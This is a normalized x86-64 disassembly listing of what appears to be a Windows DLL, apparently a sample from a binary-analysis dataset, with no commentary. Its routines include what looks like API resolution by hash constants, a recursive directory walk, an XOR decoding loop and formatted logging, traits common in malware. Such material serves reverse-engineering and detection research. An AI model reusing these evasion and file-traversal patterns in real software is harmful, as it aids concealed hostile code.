jbe r-xdata
mov eax ecx
jmp r-xdata
call sub_1800064e4
xor edx edx
sub ebx edi
div ebx
lea eax [ rdi + rdx ]
call sub_1800064e4
xor edx edx
sub edi ebx
div edi
lea eax [ rbx + rdx ]
jmp r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_1800065c8
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
test edx edx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
movsx esi r9b
movsx ebp r8b
mov ebx edx
mov edx esi
mov ecx ebp
call sub_180006584
mov [ rdi ] al
inc rdi
dec rbx
jne r-xdata
sub_18000661c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov ebp ecx
inc ecx
mov dil r8b
mov sil dl
call sub_1800042d8
mov r9b dil
mov r8b sil
mov edx ebp
mov rcx rax
mov rbx rax
call sub_1800065c8
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000666c
test rcx rcx
je r-xdata
retn
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov ebp [ rcx + 0x10 ]
mov rbx rcx
test ebp ebp
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
xor edi edi
test ebp ebp
je r-xdata
xor esi esi
mov rax [ rbx + 0x8 ]
mov rcx [ rsi + rax ]
xor ecx ecx
jmp r-xdata
inc edi
add rsi 0x8
cmp edi ebp
jb r-xdata
cmp edi [ rbx + 0x10 ]
jb r-xdata
call sub_1800062bc
test al al
je r-xdata
cmp edi [ rbx + 0x10 ]
jb r-xdata
mov rax [ rbx + 0x8 ]
mov r12 [ rsi + rax ]
xor r12d r12d
jmp r-xdata
mov edx 0x1
xor ecx ecx
mov r8d 0x81f0f0df
lea r9d [ rdx + 0x22 ]
call sub_18000365c
mov rcx r12
call rax
sub_18000670c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r8d ecx
xor edx edx
mov ecx 0x400
call sub_180003bf8
mov rcx rax
mov rdi rax
call sub_180006188
mov rcx rdi
mov bl al
call sub_1800037b8
mov al bl
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_180006748
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r12d ecx
mov ecx 0x18
call sub_1800042d8
mov ecx 0x5
mov r13 rax
call sub_180006250
mov rbp rax
mov rsi rax
test rax rax
je r-xdata
mov rcx rbp
call sub_1800042fc
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
mov rax r13
add rsp 0x20
pop r14
pop r13
pop r12
retn
call sub_1800032c8
mov r14d [ rax + 0x2c0 ]
cmp [ rsi ] 0x0
jne r-xdata
test r12d r12d
je r-xdata
mov ecx [ rsi ]
add ecx esi
mov esi ecx
cmp r14d [ rcx + 0x64 ]
jne r-xdata
mov ecx 0x18
call sub_180002178
movzx ecx [ rsi + 0x38 ]
add ecx 0x2
mov rdi rax
call sub_1800042d8
movzx r8d [ rsi + 0x38 ]
mov rdx [ rsi + 0x40 ]
mov rcx rax
mov rbx rax
call sub_180001748
mov [ rdi ] rbx
mov ecx [ rsi + 0x50 ]
mov [ rdi + 0x8 ] ecx
mov eax [ rsi + 0x58 ]
mov [ rdi + 0xc ] eax
call sub_18000670c
mov rdx rdi
test al al
mov rcx r13
setne al
mov [ rdi + 0x10 ] al
call sub_180005b28
mov rcx [ rcx + 0x40 ]
mov r8b 0x1
xor edx edx
call sub_1800059f8
cmp eax r12d
jne r-xdata
sub_180006844
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
sub rsp 0x20
mov r12d ecx
mov ecx 0x5
call sub_180006250
xor edi edi
mov rsi rax
mov rbx rax
test rax rax
je r-xdata
mov rcx rsi
call sub_1800042fc
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax edi
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call sub_1800032c8
mov ebp [ rax + 0x2c0 ]
cmp [ rbx ] edi
je r-xdata
cmp [ rcx + 0x38 ] di
je r-xdata
jmp r-xdata
mov rcx [ rcx + 0x40 ]
mov r8b 0x1
xor edx edx
call sub_1800059f8
cmp eax r12d
je r-xdata
mov ecx [ rbx ]
add ecx ebx
mov ebx ecx
cmp ebp [ rcx + 0x64 ]
jne r-xdata
mov edi [ rbx + 0x50 ]
sub_1800068d4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
xor edi edi
call sub_180006748
xor r8d r8d
mov ecx [ rax + 0x10 ]
mov rbx rax
test ecx ecx
je r-xdata
mov rcx rbx
call sub_180005aa4
mov rcx rbx
call sub_1800042fc
mov rbx [ rsp + 0x30 ]
mov eax edi
add rsp 0x20
pop rdi
retn
xor r10d r10d
cmp r8d ecx
jb r-xdata
mov rax [ rbx + 0x8 ]
mov rax [ r10 + rax ]
xor eax eax
jmp r-xdata
mov rax [ rbx + 0x8 ]
mov rax [ rax + r9 * 8 ]
xor eax eax
jmp r-xdata
mov r11d [ rax + 0x8 ]
xor edx edx
xor r9d r9d
cmp edx ecx
jb r-xdata
cmp edx ecx
jb r-xdata
inc edx
inc r9
cmp edx ecx
jb r-xdata
cmp r11d [ rax + 0xc ]
je r-xdata
mov rax [ rbx + 0x8 ]
mov rax [ rax + r9 * 8 ]
xor eax eax
jmp r-xdata
jmp r-xdata
inc r8d
add r10 0x8
cmp r8d ecx
jb r-xdata
mov edi [ rax + 0x8 ]
test edi edi
jne r-xdata
sub_180006970
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov edi 0x250dfa8f
test rcx rcx
je r-xdata
mov ecx edi
call sub_1800068d4
test eax eax
jne r-xdata
mov [ rcx ] edi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx edi
call sub_180006844
test eax eax
jne r-xdata
test rbx rbx
je r-xdata
mov edi 0xbd3cc33a
mov ecx edi
call sub_1800068d4
test eax eax
jne r-xdata
mov [ rbx ] 0xbd3cc33a
mov ecx edi
call sub_180006844
test eax eax
jne r-xdata
mov edi 0x7a38ebf3
test rbx rbx
je r-xdata
mov ecx edi
call sub_1800068d4
test eax eax
jne r-xdata
mov [ rbx ] edi
mov ecx edi
call sub_180006844
test eax eax
jne r-xdata
mov edi 0x4a36abf3
test rbx rbx
je r-xdata
mov ecx edi
call sub_1800068d4
test eax eax
jne r-xdata
mov [ rbx ] edi
mov ecx edi
call sub_180006844
test eax eax
jne r-xdata
mov edi 0x7712feae
test rbx rbx
je r-xdata
mov ecx edi
call sub_1800068d4
test eax eax
jne r-xdata
mov [ rbx ] edi
mov ecx edi
call sub_180006844
test eax eax
jne r-xdata
and [ rbx ] eax
sub_180006a40
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8d
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
lea rbp [ rax - 0x1d8 ]
sub rsp 0x2c0
mov rsi r9
mov rbx rcx
call sub_180005420
dec eax
mov rcx rbx
cmp [ rax + rbx ] 0x5c
je r-xdata
call sub_18000569c
lea r8 [ r--data ]
lea rdx [ r--data ]
call sub_18000574c
jmp r-xdata
mov rdx [ rbp + 0x1e8 ]
lea r8 [ r--data ]
mov rcx rdi
call sub_18000574c
and [ rsp + 0x40 ] 0x0
lea rcx [ rsp + 0x44 ]
xor edx edx
mov r8d 0x13c
mov rdi rax
call sub_1800017b8
mov edx 0x1
xor ecx ecx
mov r9d 0x89
mov r8d 0x32432444
call sub_18000365c
lea rdx [ rsp + 0x40 ]
mov rcx rdi
call rax
mov rcx rdi
cmp rax 0xffffffffffffffff
mov [ rsp + 0x30 ] rax
setne bl
call sub_1800042fc
test bl bl
jne r-xdata
and [ rbp + 0x80 ] 0x0
lea rcx [ rbp + 0x84 ]
xor edx edx
mov r8d 0x13c
call sub_1800017b8
lea r8 [ r--data ]
lea rdx [ r--data ]
mov rcx rdi
call sub_18000574c
mov edx 0x1
xor ecx ecx
mov r9d 0x89
mov r8d 0x32432444
mov rbx rax
call sub_18000365c
lea rdx [ rbp + 0x80 ]
mov rcx rbx
call rax
mov rcx rbx
mov [ rsp + 0x30 ] rax
call sub_1800042fc
mov rbx [ rsp + 0x30 ]
cmp rbx 0xffffffffffffffff
jne r-xdata
cmp [ rbp + 0x200 ] 0x0
mov rdi rax
mov [ rbp + 0x1e0 ] rax
je r-xdata
mov rdi [ rbp + 0x1e0 ]
mov rbx [ rsp + 0x30 ]
mov edx 0x1
xor ecx ecx
mov r9d 0x8d
mov r8d 0x7b4842c1
call sub_18000365c
mov rcx [ rsp + 0x30 ]
call rax
mov rcx [ rbp + 0x1e0 ]
jmp r-xdata
test rsi rsi
jne r-xdata
lea edx [ rbx + 0x2 ]
xor ecx ecx
mov r9d 0x8d
mov r8d 0x7b4842c1
call sub_18000365c
or rcx rbx
jmp r-xdata
cmp [ rbp + 0x200 ] 0x0
je r-xdata
lea ecx [ rsi + 0x18 ]
call j_sub_1800042d8
mov rsi rax
test rax rax
je r-xdata
call sub_1800042fc
mov rbx [ rsp + 0x2f8 ]
add rsp 0x2c0
pop rdi
pop rsi
pop rbp
retn
test [ rbp + 0x80 ] 0x10
je r-xdata
lea ecx [ rsi + 0x18 ]
call j_sub_1800042d8
mov rsi rax
test rax rax
je r-xdata
call rax
mov rcx rdi
lea rdx [ r--data ]
lea rcx [ rsp + 0x6c ]
call sub_180005648
test al al
jne r-xdata
test [ rsp + 0x40 ] 0x10
jne r-xdata
xor esi esi
and [ rax + 0x8 ] 0x0
and [ rax + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rsi ] rax
jmp r-xdata
mov edx 0x1
xor ecx ecx
mov r9d 0x8b
mov r8d 0x279dead7
call sub_18000365c
lea rdx [ rbp + 0x80 ]
mov rcx rbx
call rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rbp + 0xac ]
call sub_180005648
test al al
jne r-xdata
xor esi esi
and [ rax + 0x8 ] 0x0
and [ rax + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rsi ] rax
jmp r-xdata
mov edx 0x1
xor ecx ecx
mov r9d 0x8b
mov r8d 0x279dead7
call sub_18000365c
lea rdx [ rsp + 0x40 ]
mov rcx rbx
call rax
test rax rax
jne r-xdata
lea rdx [ r--data ]
lea rcx [ rsp + 0x6c ]
call sub_180005648
test al al
jne r-xdata
lea edx [ rax + 0x1 ]
xor ecx ecx
mov r9d 0x8d
mov r8d 0x7b4842c1
call sub_18000365c
mov rcx rbx
call rax
lea rdx [ r--data ]
lea rcx [ rbp + 0xac ]
call sub_180005648
test al al
jne r-xdata
test rsi rsi
jne r-xdata
lea edx [ rax + 0x1 ]
xor ecx ecx
mov r9d 0x8d
mov r8d 0x7b4842c1
call sub_18000365c
mov rcx rbx
mov eax [ rbp + 0x1f0 ]
test [ rsp + 0x40 ] eax
je r-xdata
lea r9 [ r--data ]
lea r8 [ r--data ]
lea rdx [ rbp + 0xac ]
mov rcx rdi
call sub_18000574c
mov rbx rax
test rsi rsi
jne r-xdata
lea r8 [ r--data ]
lea rdx [ rsp + 0x6c ]
mov rcx rdi
call sub_18000574c
mov rcx rsi
mov rdx rax
mov rbx rax
call sub_18000592c
mov rcx rbx
call sub_1800042fc
mov rbx [ rsp + 0x30 ]
test [ rbp + 0x1f0 ] 0x10
je r-xdata
lea ecx [ rsi + 0x18 ]
call j_sub_1800042d8
mov rsi rax
test rax rax
je r-xdata
mov r8d [ rbp + 0x1f0 ]
mov rdx [ rbp + 0x1e8 ]
mov r9 rsi
mov rcx rbx
mov [ rsp + 0x20 ] 0x1
call sub_180006a40
mov rcx rbx
call sub_1800042fc
mov rbx [ rsp + 0x30 ]
mov rcx [ rbp + 0x1e8 ]
lea rdx [ r--data ]
call sub_180005648
test al al
je r-xdata
xor esi esi
and [ rax + 0x8 ] 0x0
and [ rax + 0x10 ] 0x0
lea rax [ r--data ]
mov [ rsi ] rax
jmp r-xdata
mov rdx rbx
mov rcx rsi
call sub_18000592c
sub_180006e34
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
xor r9d r9d
mov rbx rdx
test r8d r8d
je r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov rdi [ rsp + 0x18 ]
mov eax r9d
retn
mov r10b [ rcx ]
xor edx edx
test r10b r10b
je r-xdata
inc r9d
cmp r9d r8d
jb r-xdata
mov sil [ r9 + rbx ]
mov al dl
inc edx
imul r9b
add al r10b
xor sil al
mov [ r9 + rbx ] sil
mov r10b [ rdx + rcx ]
test r10b r10b
jne r-xdata
sub_180006e94
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx 0x18
call sub_180002178
test rax rax
je r-xdata
mov ecx 0x1
mov [ rbx + 0x8 ] rax
call sub_180002178
test rax rax
je r-xdata
mov rcx rax
call sub_1800011ec
and [ rbx + 0x20 ] 0x0
and [ rbx + 0x10 ] 0x0
and [ rbx + 0x18 ] 0x0
mov [ rbx ] rax
mov rax rbx
add rsp 0x20
pop rbx
retn
mov rcx rax
call sub_180002280
sub_180006eec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x30
mov rbx rcx
mov rcx [ rcx ]
call sub_1800026e8
mov rcx [ rbx ]
mov [ rbx + 0x20 ] eax
call sub_180002628
mov [ rbx + 0x10 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdi [ r--data ]
lea rdx [ r--data ]
mov r8d r9d
mov [ rsp + 0x20 ] rdi
call [ rbx ]
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x1 ]
mov [ rsp + 0x20 ] rdi
call [ rbx ]
mov rbx [ rsp + 0x40 ]
mov al 0x1
add rsp 0x30
pop rdi
retn
sub_180006f8c
push rbx
sub rsp 0x30
mov rbx rcx
mov rcx [ rcx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rdx [ r--data ]
mov r8d 0x2c
call sub_1800015ec
mov [ rbx + 0x18 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x6 ]
lea rdx [ r--data ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
add rsp 0x30
pop rbx
retn
call j_sub_180002148
sub_180007000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov r15d 0x1
xor r12d r12d
mov rsi rcx
lea r13 [ r--data ]
xor ebp ebp
mov r14d r15d
mov rcx [ rsi + 0x18 ]
test rcx rcx
je r-xdata
test rdi rdi
je r-xdata
test rdi rdi
je r-xdata
call j_sub_180002148
and [ rsi + 0x18 ] 0x0
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x8
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea rdi [ r--data ]
mov rcx rdi
call j_sub_180002148
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdi [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0xc
mov [ rsp + 0x20 ] rdi
call [ rbx ]
jmp r-xdata
lea rdi [ r--data ]
mov rcx rdi
call j_sub_180002148
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdi [ r--data ]
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0x9
mov [ rsp + 0x20 ] rdi
call [ rbx ]
jmp r-xdata
mov rcx [ rsi + 0x8 ]
mov r8d 0x2c
mov rdx r13
call sub_1800015ec
mov rcx [ rsi + 0x18 ]
mov rdx rax
mov rdi rax
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
add rbp 0x2c
add r12 r15
add r13 0x2c
cmp rbp 0x84
jb r-xdata
lea rcx [ r12 + 0x1 ]
mov rax 0xaaaaaaaaaaaaaaab
mov r8d 0x2c
mul rcx
shr rdx 0x1
lea rax [ rdx + rdx * 2 ]
lea rdx [ r--data ]
sub rcx rax
imul rcx rcx 0x2c
add rdx rcx
mov rcx [ rsi + 0x8 ]
call sub_1800015ec
mov [ rsi + 0x18 ] rax
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0xb
mov [ rsp + 0x20 ] rdi
call [ rbx ]
mov rcx rsi
call sub_180006f8c
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r12 + 0x8 ]
lea rdx [ r--data ]
mov r9d r15d
mov [ rsp + 0x20 ] rdi
call [ rbx ]
xor r14d r14d
jmp r-xdata
cmp r12 0x2
jne r-xdata
mov rcx [ rw-data ]
mov rbx [ rcx ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
mov r9d r15d
mov r8d 0xd
mov [ rsp + 0x20 ] rdi
call [ rbx ]
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
mov eax r14d
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
sub_180007268
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rbp
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
push r12
push r13
push r15
sub rsp 0x30
mov rdi rcx
mov rcx [ rcx + 0x8 ]
mov r13 rdx
mov r12 r8
lea rdx [ r--data ]
mov r8d 0x2
call sub_1800015ec
mov r9 [ rw-data ]
mov rbx [ r9 ]
mov rbp rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea r15 [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x27 ]
mov [ rsp + 0x20 ] r15
call [ rbx ]
lea rcx [ r--data ]
call [ lstrlenA@IAT ]
mov rcx rbp
lea ebx [ rax + rax * 2 ]
call [ lstrlenA@IAT ]
mov rcx r13
add ebx eax
call [ lstrlenA@IAT ]
mov rcx r12
add ebx eax
call [ lstrlenA@IAT ]
lea ecx [ rax + rbx + 0x5 ]
movsxd rcx ecx
call j_sub_180002178
mov rsi rax
test rax rax
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r15
pop r13
pop r12
retn
lea rdx [ r--data ]
mov r8 rbp
mov rcx rax
call [ wsprintfA@IAT ]
lea rdx [ rdi + 0x20 ]
mov r8d 0x4
movsxd rbx eax
lea rcx [ rsi + rbx ]
call sub_180001748
add ebx 0x4
lea rdx [ r--data ]
movsxd rcx ebx
mov r9 r12
mov r8 r13
add rcx rsi
call [ wsprintfA@IAT ]
mov rcx [ rdi + 0x8 ]
mov r9b 0x1
lea r8d [ rax + rbx ]
mov rdx rsi
call sub_180001268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r9d 0x1
mov [ rsp + 0x28 ] eax
lea rdx [ r--data ]
lea r8d [ r9 + 0x28 ]
mov [ rsp + 0x20 ] r15
call [ rbx ]
mov rcx rsi
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
mov rax rdi
sub_1800073e8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x18 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x10 ]
test rcx rcx
je r-xdata
call j_sub_180002148
mov rdi [ rbx ]
test rdi rdi
je r-xdata
call j_sub_180002148
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call sub_180001000
mov rcx rdi
call sub_180002148
mov rbx [ rbx ]
test rbx rbx
je r-xdata
mov rcx rbx
call sub_180001000
mov rcx rbx
call sub_180002148
sub_18000744c
mov [ rsp + 0x18 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x30
mov rdi rcx
mov rcx [ rcx ]
call sub_180002488
mov [ rsp + 0x70 ] al
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov r15d 0x1
mov [ rsp + 0x28 ] eax
lea r14 [ r--data ]
lea rsi [ r--data ]
lea r8d [ r15 + 0xd ]
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov rcx [ rdi ]
call sub_180002484
mov [ rsp + 0x78 ] al
mov rax [ rw-data ]
mov rbx [ rax ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r15 + 0xe ]
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov rcx [ rdi ]
call sub_180002284
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ r15 + 0xf ]
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov rcx [ rdi ]
call sub_18000275c
mov rcx rax
mov r12 rax
call [ lstrlenA@IAT ]
mov rcx r13
movsxd rbx eax
call [ lstrlenA@IAT ]
movsxd rcx eax
lea rcx [ rcx + rbx + 0x3 ]
call j_sub_180002178
lea rdx [ rsp + 0x70 ]
mov r8d r15d
mov rcx rax
mov rbp rax
call sub_180001748
lea rcx [ rbp + 0x1 ]
lea rdx [ rsp + 0x78 ]
mov r8d r15d
call sub_180001748
mov rcx r13
call [ lstrlenA@IAT ]
lea rcx [ rbp + 0x2 ]
mov rdx r13
movsxd r8 eax
call sub_180001748
mov rcx r12
call [ lstrlenA@IAT ]
mov rcx r13
movsxd rbx eax
call [ lstrlenA@IAT ]
mov r8 rbx
movsxd rcx eax
mov rdx r12
lea rcx [ rcx + rbp + 0x2 ]
call sub_180001748
mov r11 [ rw-data ]
mov rbx [ r11 ]
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
lea r8d [ r15 + 0x10 ]
mov [ rsp + 0x28 ] eax
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rsi
call [ rbx ]
mov rcx [ rdi + 0x8 ]
lea rdx [ r--data ]
mov r8d r15d
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rsi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ r15 + 0x11 ]
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov r8 rbp
mov rdx rsi
mov rcx rdi
call sub_180007268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ r15 + 0x12 ]
mov r9d r15d
mov rdx r14
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx rsi
call j_sub_180002148
mov rcx rbp
call j_sub_180002148
mov rcx r12
call j_sub_180002148
mov rcx r13
call j_sub_180002148
mov rbx [ rsp + 0x80 ]
mov rax rdi
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
sub_1800076a4
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov rbx rcx
mov ecx 0x401
call j_sub_180002178
mov ecx 0x8
mov [ rsp + 0x90 ] rax
call sub_180002178
test rax rax
je r-xdata
xor esi esi
mov rcx rax
call sub_180001ef8
mov rsi rax
jmp r-xdata
mov rax rbp
mov rbx [ rsp + 0x98 ]
add rsp 0x40
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rbx
call sub_180001dbc
mov rcx rbx
call sub_180002148
mov rcx [ rbx + 0x8 ]
lea rdx [ r--data ]
mov r8d 0xa
mov [ rsp + 0x88 ] rsi
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r15 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov ebp 0x1
mov [ rsp + 0x28 ] eax
lea r12 [ r--data ]
lea r13 [ r--data ]
lea r8d [ rbp + 0x42 ]
mov r9d ebp
mov rdx r12
mov [ rsp + 0x20 ] r13
call [ rbx ]
lea edx [ rbp + 0x5 ]
lea r8d [ rbp + 0x4 ]
mov rcx rsi
call sub_180001fe8
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r14 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ rbp + 0x43 ]
mov r9d ebp
mov rdx r12
mov [ rsp + 0x20 ] r13
call [ rbx ]
lea r8d [ rbp + 0x6 ]
mov edx ebp
mov rcx rsi
call sub_180001f10
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea r8d [ rbp + 0x44 ]
mov r9d ebp
mov rdx r12
mov [ rsp + 0x20 ] r13
call [ rbx ]
mov edx edi
mov rcx rsi
call sub_180001f3c
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r13 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r8d [ rbp + 0x45 ]
mov r9d ebp
mov rdx r12
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea edi [ rbp + 0x2 ]
mov r8d edi
xor edx edx
mov rcx rsi
call sub_180001f10
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov ebp eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
lea rax [ r--data ]
lea r9d [ rdi - 0x2 ]
lea r8d [ rdi + 0x44 ]
mov rdx r12
mov [ rsp + 0x20 ] rax
call [ rbx ]
lea edx [ rdi - 0x2 ]
mov r8d edi
mov rcx rsi
call sub_180001f10
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov edi eax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea r8d [ r9 + 0x47 ]
mov rdx r12
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov edx edi
mov rcx rsi
call sub_180001f3c
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov r12 rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x48 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx r15
call [ lstrlenA@IAT ]
mov rdi [ rsp + 0x80 ]
xor r9d r9d
mov rcx [ rdi + 0x8 ]
mov r8d eax
mov rdx r15
call sub_180001268
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rsi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x49 ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
mov rcx [ rdi + 0x8 ]
lea rax [ r--data ]
lea rdx [ rbp + rbp * 4 ]
mov r8d 0x5
add rdx rax
call sub_1800015ec
mov rcx [ rw-data ]
mov rbx [ rcx ]
mov rdi rax
call [ GetLastError@IAT ]
mov rcx [ rw-data ]
mov [ rsp + 0x28 ] eax
mov r9d 0x1
lea rax [ r--data ]
lea rdx [ r--data ]
lea r8d [ r9 + 0x4a ]
mov [ rsp + 0x20 ] rax
call [ rbx ]
